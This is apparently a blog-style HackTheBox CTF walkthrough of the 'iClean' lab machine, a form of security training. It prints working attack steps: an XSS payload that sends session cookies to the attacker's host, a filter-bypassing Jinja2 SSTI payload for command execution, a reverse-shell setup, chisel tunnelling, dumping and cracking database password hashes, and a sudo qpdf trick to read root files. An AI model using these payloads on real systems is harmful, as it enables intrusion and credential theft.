---
layout: post
title: iClean HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox medium,linux]
permalink: /posts/iclean-htb
image:
  path: /images/htb/medium/iclean/icon.png
---

I got through this surprisingly quickly!! Good machine.

**Machine created by:** [LazyTitan33](https://app.hackthebox.com/users/512308)

## Recon
I start off my recon by doing a portscan of the IP.

```
$sudo nmap -p- -T5 10.10.11.12
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-23 23:27 AEST
...
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp open  http
```

We can see 2 open ports, mainly of interest is HTTP.

I visit [10.10.11.12:80](http://10.10.11.12) and get redirected to `capiclean.htb`, which I put into my `/etc/hosts` file.

After that visiting `capiclean.htb` has a pretty normal cleaning website:
![Front Page](/images/htb/medium/iclean/home.png)

I do alot of exploring and come up blank, so I decide to run `ffuf`.
```
$ ffuf -w ./directory-list-2.3-medium.txt -u "http://capiclean.htb/FUZZ"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://capiclean.htb/FUZZ
 :: Wordlist         : FUZZ: ./directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

...
login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 31ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 82ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 68ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 66ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 56ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 61ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 63ms]
...
```

Checking each of these we see something new on `/quote`.
![Quote](/images/htb/medium/iclean/quote.png)

Sending a quote sends it to the management staff, as it says on the sent page.
![Sent Page](/images/htb/medium/iclean/sent.png)

So can we do session hyjacking? I sent up a payload and a Python3 http.server.

```
$ python3 -m http.server 4567
Serving HTTP on :: port 4567 (http://[::]:4567/) ...
```

I setup my payload to be the following for the request:
```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
...
service=<img+src%3dx+onerror%3d"this.src%3d`http%3a//10.10.16.37%3a4567/x?%24%7bdocument.cookie%7d`">&email=tesing%40seall.dev
```

and I get a pingback!
```
10.10.11.12 - - [13/May/2024 09:45:06] "GET /x?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZkIVMg.JLlwWpQy-B5-tFVD1EUL9p6AZGs HTTP/1.1" 404 -
10.10.11.12 - - [13/May/2024 09:45:07] code 404, message File not found
```

## Initial Access

I use EditThisCookie2 to make a `session` cookie and set it.

![Admin Dash](/images/htb/medium/iclean/dash.png)

I check into 'Generate Invoice' first, as its first on the list and it seems to make an 'Invoice ID' which I note down.

I go to the QR Code generator and see it needs an invoice ID, I use the one we generated earlier.

![QR Gen](/images/htb/medium/iclean/qr.png)

After some testing of various exploits I find an SSTI on the QR Link input, when supplying `{%raw%}{{7*7}}{%endraw%}` as the payload, we can see an un-rendered QR code on the PDF report. Opening it has the data url `data:image/png;base64,49` so we can see it executed correctly.

![Report](/images/htb/medium/iclean/invoice.png)

The first thing I try is the classic Jinja2 SSTI RCE. Which fails with a 500, after stripping it down I can execute `{%raw%}{{cycler}}{%endraw%}` but the second I add `.__init__` it 500's. I know it doesn't fail from the period as `{%raw%}{{config.items()}}{%endraw%}` passes, so its the `_`'s. How can we bypass the filter... URL encoding fails, but perhaps using `\xXX` can work?

After *alot* of testing I found `{%raw%}{{cycler["\x5F\x5Finit\x5F\x5F"]}}{%endraw%}` doesn't 500 error. So after a bit of work I get the following payload that suceeds:
```
{%raw%}{{cycler["\x5F\x5Finit\x5F\x5F"]["\x5F\x5Fglobals\x5F\x5F"]["os"]["popen"]("id")["read"]()}}{%endraw%}
```
So, let's get a reverse shell kicking.

I setup my netcat listener (pwncat wasn't cooperating today...)
```
$ nc -lvnp 4444
listening on [any] 4444 ...
```

I get a reverse shell from [RevShells](https://revshells.com) and put it as the command in the above payload. I use the `nc mkinfo` revshell with URL encoding and get a response.
```
connect to [10.10.16.37]...
```

I'm now the user `www-data` so not user yet!

## User Flag

I poke around the current directory of `www-data` (`/opt/app`) and inside `app.py` are some hard-coded credentials:
```
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

We can utilise these for, presumably, a locally running DB. Checking the ports running locally with `netstat -ntlp` there is port `3306` which is an MySQL server. I get a copy of [`chisel`](https://github.com/jpillora/chisel) on the server from my local machine using a `python3 -m http.server` server.

After `wget`ing it down from my server, I do the following. Firstly on my machine I run this:
```
$ chisel server -p 8000 --reverse
```

This set's up my computer to recieve the port-forward.
On the victim machine I run this:
```
$ chmod +x chisel
$ ./chisel client 10.10.16.37:8000 R:3306:127.0.0.1:3306
```

This set's up the `chisel` binary to be executable and then connects as a client to the server on my machine, forwarding the port `3306`.

Now that we have access to the MySQL port locally, I conenct with the credentials:
```
$ mysql -u iclean -ppxCsmnGLckUb -h 127.0.0.1 capiclean
```

Once connected I run `SHOW TABLES;` to see what we have:
```
MySQL [capiclean]> SHOW TABLES;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.077 sec)
```

Ok, I read all of `users` immediately and we get some good looking data:
```
MySQL [capiclean]> SELECT * FROM users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.089 sec)
```

Let's crack em!
```
$ hashcat -m 1400 hashes rockyou.txt
...
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

So we have the user `consuela`'s password, let's try SSH as them.
```
$ ssh consuela@capiclean.htb
...
consuela@iclean:~$ cat user.txt
e1b16b39f2af4a757c3a67e131e49df2
```

There's our user flag! <mark>e1b16b39f2af4a757c3a67e131e49df2</mark>

## Root Flag

I instinctinly use `sudo -l` to see if we have any permssions:
```
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

Nice! What can we do with this?
```
$ /usr/bin/qpdf --help
Run "qpdf --help=topic" for help on a topic.
Run "qpdf --help=--option" for help on an option.
Run "qpdf --help=all" to see all available help.

Topics:
  add-attachment: attach (embed) files
  advanced-control: tweak qpdf's behavior
  attachments: work with embedded files
  completion: shell completion
  copy-attachments: copy attachments from another file
  encryption: create encrypted files
  exit-status: meanings of qpdf's exit codes
  general: general options
  help: information about qpdf
  inspection: inspect PDF files
  json: JSON output for PDF information
  modification: change parts of the PDF
  overlay-underlay: overlay/underlay pages from other files
  page-ranges: page range syntax
  page-selection: select pages from one or more files
  pdf-dates: PDF date format
  testing: options for testing or debugging
  transformation: make structural PDF changes
  usage: basic invocation

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
$ /usr/bin/qpdf --help=attachments
It is possible to list, add, or delete embedded files (also known
as attachments) and to copy attachments from other files. See help
on individual options for details. Run qpdf --help=add-attachment
for additional details about adding attachments. See also
--help=--list-attachments and --help=--show-attachment.

Related options:
  --add-attachment: start add attachment options
  --copy-attachments-from: start copy attachment options
  --remove-attachment: remove an embedded file

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

So, I look into attachments as we are trying to read `root.txt`, so if we get a PDF, we can try attach the `root.txt`, then read it. I download a [sample PDF](https://pdfobject.com/pdf/sample.pdf) and upload it, then try it out.

```
consuela@iclean:~$ sudo /usr/bin/qpdf --add-attachment /root/root.txt -- sample.pdf test.pdf
consuela@iclean:~$ sudo /usr/bin/qpdf --show-attachment=root.txt test.pdf
cbb6abcc337873f5036db59f7348d16b
```

Bam! Root Flag: <mark>cbb6abcc337873f5036db59f7348d16b</mark>

![Success](/images/htb/medium/iclean/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.